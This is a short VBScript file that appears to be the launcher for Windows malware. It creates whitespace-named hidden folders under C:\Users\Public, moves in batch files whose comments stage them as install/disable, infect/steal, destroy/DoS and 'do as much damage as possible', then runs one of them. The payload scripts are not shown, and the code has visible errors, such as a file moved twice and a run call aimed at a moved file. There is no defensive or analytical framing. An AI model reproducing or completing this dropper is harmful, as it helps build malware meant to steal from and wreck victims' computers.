DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )
user=oShell.ExpandEnvironmentStrings("%UserName%")

SET FSO=CreateObject("Scripting.FileSystemObject")
FSO.CreateFolder("C:\Users\Public\ \")
FSO.CreateFolder("C:\Users\Public\ \ \")

FSO.Movefile "file\1.vbs", "C:\Users\Public\ \" ' start | run
FSO.Movefile "file\a.bat","C:\Users\Public\ \ \" ' Hour 1 | Install/Disable
FSO.Movefile "file\b.bat","C:\Users\Public\ \ \" ' Hour 2 | Infect/steal
FSO.Movefile "file\c.bat","C:\Users\Public\ \ \" ' Hour 3 | Destroy/Dos
FSO.Movefile "file\d.bat","C:\Users\Public\ \ \" ' Hour 4 | Do as much damage as possible
FSO.Movefile "file\d.bat","C:\Users\Public\ \ \" ' Hour 4 | Delete/finish

CreateObject("Wscript.Shell").Run """d.bat""", 1, True
